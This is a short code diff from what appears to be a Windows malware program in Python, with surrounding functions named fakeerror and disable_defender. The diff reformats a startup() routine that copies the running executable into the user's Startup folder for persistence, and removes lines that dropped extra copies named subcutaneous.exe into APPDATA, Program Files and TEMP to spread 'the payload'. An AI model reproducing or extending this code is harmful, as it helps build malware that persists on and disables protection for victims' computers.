@@ -125,29 +125,17 @@ def fakeerror():
 
 
 def startup():
-  startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
- if hasattr(sys, 'frozen'):
-     source_path = sys.executable
- else:
-     source_path = sys.argv[0]
+    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if hasattr(sys, 'frozen'):
+        source_path = sys.executable
+    else:
+        source_path = sys.argv[0]
 
- target_path = os.path.join(startup_path, os.path.basename(source_path))
- if os.path.exists(target_path):
-    os.remove(target_path)
+    target_path = os.path.join(startup_path, os.path.basename(source_path))
+    if os.path.exists(target_path):
+        os.remove(target_path)
 
- copy2(source_path, startup_path)
-
- # Add the following code to copy the file to additional locations and execute the payload upon running:
-
- appdata_path = os.path.join(os.getenv("APPDATA"), "subcutaneous.exe")
- copy2(source_path, appdata_path)
-
- program_files_path = os.path.join("C:", "Program Files", "subcutaneous.exe")
- copy2(source_path, program_files_path)
-
- temp_path = os.path.join(os.getenv("TEMP"), "subcutaneous.exe")
- copy2(source_path, temp_path)
-
+    copy2(source_path, startup_path)
 
 
 def disable_defender():
